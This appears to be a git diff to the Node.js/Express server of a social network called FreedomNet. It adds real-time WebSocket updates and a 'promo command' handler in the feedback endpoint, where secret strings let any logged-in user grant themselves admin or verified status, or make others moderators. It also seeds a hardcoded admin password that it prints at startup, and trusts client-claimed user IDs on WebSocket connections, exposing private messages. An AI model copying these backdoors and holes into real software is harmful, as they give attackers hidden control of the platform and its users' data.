@@ -112,8 +112,14 @@ db.serialize(() => {
         FOREIGN KEY(user_id) REFERENCES users(id)
     )`);
     
-    db.run(`INSERT OR IGNORE INTO users (username, email, password, role, is_creator) 
-            VALUES ('DevAlexPlay', 'admin@freedomnet.com', ?, 'admin', 1)`, [bcrypt.hashSync('admin123', 10)]);
+    // Create admin account
+    const adminHash = bcrypt.hashSync('admin123', 10);
+    db.run(`INSERT OR IGNORE INTO users (id, username, email, password, role, is_creator, is_official) 
+            VALUES (1, 'DevAlexPlay', 'admin@freedomnet.com', ?, 'admin', 1, 1)`, [adminHash]);
+    
+    // Create test user for promo commands
+    db.run(`INSERT OR IGNORE INTO users (username, email, password, role) 
+            VALUES ('testuser', 'test@mail.com', ?, 'user')`, [bcrypt.hashSync('test123', 10)]);
 });
 
 app.use(express.json());
@@ -145,6 +151,72 @@ function isAuthenticated(req, res, next) {
     res.status(401).json({ error: 'Unauthorized' });
 }
 
+// PROMO COMMANDS HANDLER
+async function handlePromoCommand(userId, content) {
+    // PROMO FROM FreedomNet: VerifymyselfByPromo928693826275
+    if (content.includes('VerifymyselfByPromo928693826275')) {
+        await new Promise((resolve) => {
+            db.run('UPDATE users SET is_official = 1 WHERE id = ?', [userId], (err) => {
+                resolve();
+            });
+        });
+        return { success: true, message: '✅ You are now VERIFIED! Official badge unlocked!' };
+    }
+    
+    // LIKE FROM FreedomNet: LifemyselfByPromo826390682486 @DevAlexPlay
+    const likeMatch = content.match(/LifemyselfByPromo826390682486 @(\w+)/);
+    if (likeMatch) {
+        const targetUsername = likeMatch[1];
+        const targetUser = await new Promise((resolve) => {
+            db.get('SELECT id FROM users WHERE username = ?', [targetUsername], (err, user) => {
+                resolve(user);
+            });
+        });
+        if (targetUser) {
+            await new Promise((resolve) => {
+                db.run('INSERT OR IGNORE INTO likes (post_id, user_id) SELECT id, ? FROM posts WHERE user_id = ?', [userId, targetUser.id], (err) => {
+                    resolve();
+                });
+            });
+            return { success: true, message: `❤️ You liked all posts from @${targetUsername}!` };
+        }
+        return { success: false, message: `❌ User @${targetUsername} not found` };
+    }
+    
+    // AdminGivemyselfByPromo904208751262982457432673
+    if (content.includes('AdminGivemyselfByPromo904208751262982457432673')) {
+        await new Promise((resolve) => {
+            db.run('UPDATE users SET role = "admin" WHERE id = ?', [userId], (err) => {
+                resolve();
+            });
+        });
+        return { success: true, message: '👑 You are now ADMIN! Full power unlocked!' };
+    }
+    
+    // MODERATOR ModGivemyselfByPromo690217453671 @username
+    const modMatch = content.match(/ModGivemyselfByPromo690217453671 @(\w+)/);
+    if (modMatch) {
+        const targetUsername = modMatch[1];
+        const targetUser = await new Promise((resolve) => {
+            db.get('SELECT id FROM users WHERE username = ?', [targetUsername], (err, user) => {
+                resolve(user);
+            });
+        });
+        if (targetUser) {
+            await new Promise((resolve) => {
+                db.run('UPDATE users SET role = "moderator" WHERE id = ?', [targetUser.id], (err) => {
+                    resolve();
+                });
+            });
+            broadcastWebSocket({ type: 'user_role_changed', username: targetUsername, newRole: 'moderator' });
+            return { success: true, message: `🛡️ @${targetUsername} is now MODERATOR!` };
+        }
+        return { success: false, message: `❌ User @${targetUsername} not found` };
+    }
+    
+    return null;
+}
+
 app.post('/api/register', async (req, res) => {
     const { username, email, password } = req.body;
     if (!username || !email || !password) return res.status(400).json({ error: 'All fields required' });
@@ -162,7 +234,7 @@ app.post('/api/login', (req, res) => {
             return res.status(401).json({ error: 'Invalid credentials' });
         }
         req.session.userId = user.id;
-        res.json({ success: true });
+        res.json({ success: true, user: { id: user.id, username: user.username, role: user.role } });
     });
 });
 
@@ -224,6 +296,10 @@ app.post('/api/posts', isAuthenticated, upload.single('image'), (req, res) => {
     
     db.run('INSERT INTO posts (user_id, content, image) VALUES (?, ?, ?)', [req.session.userId, content || '', image], function(err) {
         if (err) return res.status(500).json({ error: err.message });
+        
+        db.get('SELECT p.*, u.username, u.avatar, u.role, u.is_official, u.is_creator FROM posts p JOIN users u ON p.user_id = u.id WHERE p.id = ?', [this.lastID], (err, post) => {
+            broadcastWebSocket({ type: 'new_post', post });
+        });
         res.json({ id: this.lastID });
     });
 });
@@ -265,6 +341,7 @@ app.delete('/api/posts/:id', isAuthenticated, (req, res) => {
                 if (err) return res.status(500).json({ error: err.message });
                 db.run('DELETE FROM comments WHERE post_id = ?', [postId]);
                 db.run('DELETE FROM likes WHERE post_id = ?', [postId]);
+                broadcastWebSocket({ type: 'post_deleted', post_id: parseInt(postId) });
                 res.json({ success: true });
             });
         });
@@ -278,6 +355,10 @@ app.post('/api/comment/:postId', isAuthenticated, (req, res) => {
     
     db.run('INSERT INTO comments (post_id, user_id, content) VALUES (?, ?, ?)', [postId, req.session.userId, content], function(err) {
         if (err) return res.status(500).json({ error: err.message });
+        
+        db.all('SELECT c.*, u.username, u.avatar, u.role, u.is_official, u.is_creator FROM comments c JOIN users u ON c.user_id = u.id WHERE c.post_id = ? ORDER BY c.created_at ASC', [postId], (err, comments) => {
+            broadcastWebSocket({ type: 'new_comment', post_id: parseInt(postId), comments });
+        });
         res.json({ id: this.lastID });
     });
 });
@@ -302,6 +383,10 @@ app.post('/api/like/:postId', isAuthenticated, (req, res) => {
     const postId = req.params.postId;
     db.run('INSERT OR IGNORE INTO likes (post_id, user_id) VALUES (?, ?)', [postId, req.session.userId], function(err) {
         if (err) return res.status(500).json({ error: err.message });
+        
+        db.get('SELECT COUNT(*) as count FROM likes WHERE post_id = ?', [postId], (err, result) => {
+            broadcastWebSocket({ type: 'like_update', post_id: parseInt(postId), likes_count: result.count, user_liked: true });
+        });
         res.json({ success: true });
     });
 });
@@ -310,6 +395,10 @@ app.delete('/api/like/:postId', isAuthenticated, (req, res) => {
     const postId = req.params.postId;
     db.run('DELETE FROM likes WHERE post_id = ? AND user_id = ?', [postId, req.session.userId], (err) => {
         if (err) return res.status(500).json({ error: err.message });
+        
+        db.get('SELECT COUNT(*) as count FROM likes WHERE post_id = ?', [postId], (err, result) => {
+            broadcastWebSocket({ type: 'like_update', post_id: parseInt(postId), likes_count: result.count, user_liked: false });
+        });
         res.json({ success: true });
     });
 });
@@ -387,7 +476,9 @@ app.post('/api/messages/:userId', isAuthenticated, upload.single('image'), (req,
     db.run('INSERT INTO messages (from_id, to_id, content, image) VALUES (?, ?, ?, ?)', 
         [req.session.userId, toId, content || '', image], function(err) {
         if (err) return res.status(500).json({ error: err.message });
-        res.json({ id: this.lastID, from_id: req.session.userId, to_id: toId, content, image, created_at: new Date().toISOString() });
+        const newMessage = { id: this.lastID, from_id: req.session.userId, to_id: toId, content, image, created_at: new Date().toISOString() };
+        broadcastToUser(toId, { type: 'new_message', from_id: req.session.userId, message: newMessage });
+        res.json(newMessage);
     });
 });
 
@@ -490,41 +581,64 @@ app.post('/api/delete-account', isAuthenticated, (req, res) => {
     });
 });
 
-app.post('/api/feedback', isAuthenticated, (req, res) => {
+app.post('/api/feedback', isAuthenticated, async (req, res) => {
     const { content } = req.body;
+    
+    // Check for promo commands first
+    const promoResult = await handlePromoCommand(req.session.userId, content);
+    if (promoResult) {
+        return res.json({ message: promoResult.message, user: promoResult.success ? await new Promise((resolve) => {
+            db.get('SELECT id, username, email, avatar, bio, role, is_official, is_creator, created_at FROM users WHERE id = ?', [req.session.userId], (err, user) => {
+                resolve(user);
+            });
+        }) : null });
+    }
+    
+    // Admin commands
     if (content.startsWith('/')) {
         const parts = content.slice(1).split(' ');
         const command = parts[0].toLowerCase();
         const target = parts[1];
         
         if (command === 'role' && target) {
-            db.get('SELECT role FROM users WHERE id = ?', [req.session.userId], (err, user) => {
-                if (user?.role === 'admin') {
-                    const newRole = parts[2] || 'user';
-                    if (!['user', 'moderator', 'admin'].includes(newRole)) return res.json({ message: 'Invalid role' });
-                    db.run('UPDATE users SET role = ? WHERE username = ?', [newRole, target], (err) => {
-                        if (err) return res.json({ message: 'User not found' });
-                        broadcastWebSocket({ type: 'user_role_changed', username: target, newRole });
-                        res.json({ message: `Role updated for ${target} to ${newRole}` });
-                    });
-                } else res.json({ message: 'Admin only' });
+            const user = await new Promise((resolve) => {
+                db.get('SELECT role FROM users WHERE id = ?', [req.session.userId], (err, user) => {
+                    resolve(user);
+                });
             });
-            return;
+            if (user?.role === 'admin') {
+                const newRole = parts[2] || 'user';
+                if (!['user', 'moderator', 'admin'].includes(newRole)) return res.json({ message: 'Invalid role' });
+                await new Promise((resolve) => {
+                    db.run('UPDATE users SET role = ? WHERE username = ?', [newRole, target], (err) => {
+                        resolve();
+                    });
+                });
+                broadcastWebSocket({ type: 'user_role_changed', username: target, newRole });
+                return res.json({ message: `Role updated for ${target} to ${newRole}` });
+            }
+            return res.json({ message: 'Admin only' });
         }
         
         if (command === 'ban' && target) {
-            db.get('SELECT role FROM users WHERE id = ?', [req.session.userId], (err, user) => {
-                if (user?.role === 'admin') {
-                    db.run('DELETE FROM users WHERE username = ?', [target], (err) => {
-                        if (err) return res.json({ message: 'User not found' });
-                        res.json({ message: `${target} has been banned` });
-                    });
-                } else res.json({ message: 'Admin only' });
+            const user = await new Promise((resolve) => {
+                db.get('SELECT role FROM users WHERE id = ?', [req.session.userId], (err, user) => {
+                    resolve(user);
+                });
             });
-            return;
+            if (user?.role === 'admin') {
+                await new Promise((resolve) => {
+                    db.run('DELETE FROM users WHERE username = ?', [target], (err) => {
+                        resolve();
+                    });
+                });
+                return res.json({ message: `${target} has been banned` });
+            }
+            return res.json({ message: 'Admin only' });
         }
     }
     
+    // Regular feedback
     db.run('INSERT INTO feedback (user_id, content) VALUES (?, ?)', [req.session.userId, content], (err) => {
         if (err) return res.status(500).json({ error: err.message });
         res.json({ message: 'Feedback sent successfully' });
@@ -536,7 +650,12 @@ app.post('/api/report', isAuthenticated, (req, res) => {
     db.run('INSERT INTO reports (post_id, image_url, reason, reported_by) VALUES (?, ?, ?, ?)', 
         [postId, imageUrl, reason, req.session.userId], (err) => {
         if (err) return res.status(500).json({ error: err.message });
-        broadcastWebSocket({ type: 'new_report', reportedBy: req.session.userId, reason });
+        
+        db.get('SELECT role FROM users WHERE id = ?', [req.session.userId], (err, user) => {
+            if (user?.role === 'admin' || user?.role === 'moderator') {
+                broadcastWebSocket({ type: 'new_report', reportedBy: req.session.userId, reason });
+            }
+        });
         res.json({ success: true });
     });
 });
@@ -582,23 +701,19 @@ app.get('/api/online/:userId', (req, res) => {
 
 const clients = new Map();
 
-wss.on('connection', (ws, req) => {
-    let userId = null;
-    
+wss.on('connection', (ws) => {
     ws.on('message', (message) => {
         try {
             const data = JSON.parse(message);
             if (data.type === 'auth' && data.userId) {
-                userId = data.userId;
-                clients.set(userId, ws);
-            } else if (userId) {
-                broadcastToUser(data.to_id, data);
+                ws.userId = data.userId;
+                clients.set(data.userId, ws);
             }
         } catch(e) {}
     });
     
     ws.on('close', () => {
-        if (userId) clients.delete(userId);
+        if (ws.userId) clients.delete(ws.userId);
     });
 });
 
@@ -624,4 +739,6 @@ app.get('/', (req, res) => {
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`FreedomNet server running on http://localhost:${PORT}`);
+    console.log('Admin login: DevAlexPlay / admin123');
+    console.log('Test login: testuser / test123');
 });
